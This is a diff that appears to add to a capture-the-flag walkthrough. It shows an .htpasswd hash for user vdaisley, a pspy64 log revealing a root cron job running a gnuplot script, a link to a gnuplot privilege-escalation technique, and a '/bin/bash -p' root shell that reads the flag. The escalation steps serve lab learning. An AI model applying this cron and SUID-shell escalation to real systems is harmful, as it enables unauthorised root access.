@@ -67,4 +67,29 @@ username:wrongrelm:99cd340e1283c6d0ab34734bd47bdc30
 -rw-r--r-- 1 www-data www-data 47 Jan 17  2023 /var/www/dev/.htpasswd
 vdaisley:$apr1$1ONUB/S2$58eeNVirnRDB5zAIbIxTY0
 ```
-also found these hashes
+also found these hashes.
+On tmp file also i found pspy64
+when i run pspy64.
+```
+2023/10/27 16:47:15 CMD: UID=0     PID=1      | /sbin/init 
+2023/10/27 16:48:01 CMD: UID=0     PID=71766  | /usr/sbin/CRON -f 
+2023/10/27 16:48:01 CMD: UID=0     PID=71765  | /usr/sbin/CRON -f 
+2023/10/27 16:48:01 CMD: UID=0     PID=71768  | /bin/sh /opt/gnuplot/getdata.sh 
+2023/10/27 16:48:01 CMD: UID=0     PID=71767  | /bin/sh -c /opt/gnuplot/getdata.sh 
+2023/10/27 16:48:01 CMD: UID=0     PID=71772  | /bin/sh /opt/gnuplot/getdata.sh 
+2023/10/27 16:48:01 CMD: UID=0     PID=71771  | /bin/sh /opt/gnuplot/getdata.sh 
+2023/10/27 16:48:01 CMD: UID=0     PID=71770  | /bin/sh /opt/gnuplot/getdata.sh 
+2023/10/27 16:48:01 CMD: UID=0     PID=71769  | /bin/sh /opt/gnuplot/getdata.sh 
+```
+i found gnuplot.
+`https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/gnuplot-privilege-escalation/?source=post_page-----1e4cf07d7805--------------------------------
+`
+```
+-bash-5.0$ /bin/bash -p
+bash-5.0# id
+uid=1007(vdaisley) gid=1007(vdaisley) euid=0(root) groups=1007(vdaisley)
+bash-5.0# whoami
+root
+bash-5.0# cat root.txt
+8072065e1b35829342207ed420d4c7e9
+```
